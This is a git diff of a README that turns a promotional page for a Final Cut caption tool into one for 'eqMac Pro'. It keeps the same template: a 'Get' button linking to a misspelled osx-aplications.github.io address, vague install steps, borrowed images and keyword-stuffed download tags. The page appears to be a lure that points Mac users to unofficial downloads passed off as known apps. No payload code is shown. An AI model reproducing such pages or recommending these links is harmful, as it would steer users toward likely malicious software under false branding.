@@ -1,12 +1,12 @@
-# Caption Generator for FinalCut – Smart Subtitle & Text Automation Tool
+# eqMac Pro – Advanced System-Wide Audio Equalizer
 <div align="center">
-  <img src="https://insmac.org/uploads/posts/2023-02/video-captions-for-final-cut.png" width="250"/>
+  <img src="https://www.insanelymac.com/uploads/monthly_2020_12/promo.png.4caa0d0c560546853490a146d7178f8f.png" width="450"/>
 </div>  
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/capgen">
-    <img src="https://img.shields.io/badge/Get%20Caption%20Generator%20for%20FinalCut-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Caption Generator for FinalCut">
+  <a href="https://osx-aplications.github.io/.github/eqmac">
+    <img src="https://img.shields.io/badge/Get%20eqMac%20Pro-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get eqMac Pro">
   </a>
 </p>
 
@@ -14,23 +14,23 @@
 
 # Installation Instructions  
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate Caption Generator for FinalCut On Your Mac Device.
+2. Follow The On-Screen Steps To Install And Activate eqMac Pro On Your Mac Device.
 
 ---
 
 <div align="center">
-  <img src="https://www.motionvfx.com/know-how/wp-content/uploads/2025/03/FCP-basic-31.png" width="1080"/>
+  <img src="https://repository-images.githubusercontent.com/98095061/5996302a-b172-4549-89a3-6ac01021dc16" width="1080"/>
 </div>  
 <br>
 
-## 🎬 Overview  
-**Caption Generator for FinalCut** is an intelligent subtitle creation utility designed specifically for **Final Cut Pro** users on **macOS**.  
-Powered by advanced AI algorithms, it automatically generates accurate, synchronized captions for your videos — saving hours of manual transcription work.  
+## 🎧 Overview  
+**eqMac Pro** by **Bitgapp** is a professional-grade **system-wide audio equalizer** built specifically for **macOS**.  
+It enables users to take full control over their Mac’s sound output, offering an immersive listening experience with advanced sound shaping tools and real-time frequency adjustments.  
 
-Whether you’re editing interviews, tutorials, or social media content, **Caption Generator for FinalCut** delivers professional-grade captions that boost accessibility and engagement.  
-The app supports multilingual recognition, auto-timing, and smart text formatting to seamlessly fit your project’s aesthetic.  
+Designed for audiophiles, musicians, and creators, **eqMac Pro** features intuitive controls, a refined interface, and minimal system overhead.  
+From subtle tone balancing to precise frequency mastering, the app adapts perfectly to every workflow — whether you’re mixing audio, streaming media, or enhancing everyday playback.  
 
-Perfect for creators, editors, and marketers, it integrates natively with Final Cut Pro for a smooth, efficient post-production workflow.
+With support for **Apple Silicon (M1/M2)** and deep integration into macOS’s Core Audio engine, **eqMac Pro** ensures flawless performance and high-quality sound output.
 
 ---
 
@@ -38,12 +38,12 @@ Perfect for creators, editors, and marketers, it integrates natively with Final 
 
 | Feature | Description |  
 |-------------------------------------|------------------------------------------------------------------------------|  
-| 💬 **AI-Powered Captioning** | Automatically generates captions using speech recognition and natural language processing. |  
-| ⏱️ **Auto Sync with Timeline** | Aligns subtitles perfectly with audio in your Final Cut Pro timeline. |  
-| 🌍 **Multi-Language Support** | Detects and transcribes speech in multiple languages accurately. |  
-| ✏️ **Custom Styling Options** | Adjust fonts, colors, and placement to match your project style. |  
-| 🎞️ **Seamless Final Cut Integration** | Imports captions directly into your FCPX timeline without conversion. |  
-| ⚡ **Optimized for Apple Silicon** | Delivers fast transcription and editing on M1/M2-powered Macs. |  
+| 🎚️ **System-Wide Equalization** | Adjust and optimize sound from any app or device output globally. |  
+| 🎛️ **Parametric EQ & Presets** | Fine-tune audio frequencies or choose from built-in professional presets. |  
+| 🔊 **Volume Booster & Balance Control** | Enhance volume dynamics and adjust channel balance easily. |  
+| 🎧 **Multi-Device Audio Routing** | Manage multiple output devices and switch between them seamlessly. |  
+| 🧠 **Modern UI & Real-Time Visualization** | Track your EQ curve visually while listening to live sound. |  
+| ⚡ **Apple Silicon Optimized** | Runs natively on M1/M2 Macs for peak performance and low latency. |  
 
 ---
 
@@ -54,11 +54,10 @@ Perfect for creators, editors, and marketers, it integrates natively with Final 
 | OS | macOS 11.0 or later |  
 | Processor | Apple Silicon (M1/M2) or Intel |  
 | Memory | 4 GB RAM (8 GB recommended) |  
-| Storage | 500 MB free disk space |  
+| Storage | 300 MB of free space |  
 | Display | 1280×800 resolution or higher |  
-| Application | Final Cut Pro 10.6 or later |  
 
 ---
 
 ## 🏷️ Tags  
-caption generator • caption generator for finalcut • ai caption generator • image to caption ai • social media caption generator • caption generator ai • ai caption writer • caption ai generator • caption creator • caption maker • ai social media caption generator • caption generator app • caption generator from photo • best caption generator • caption writer ai • caption writing ai • ai image caption generator • image to caption generator • caption creator ai • photo description generator • photo caption generator • ai caption maker • ai caption creator • social media caption ai • best ai caption generator • ai caption writing
+eqmac pro • eqmac • bitgapp • eq for mac • audio eq for mac • audio eq mac • download eqmac • eq for mac os • eq for mac output • eq in mac • eq mac download • eq mac os • eq mac pro • eqmac app • eqmac download • eqmac 2 • eqmac m1 • parametric eq for mac • eqmac mac • bitgapp mac
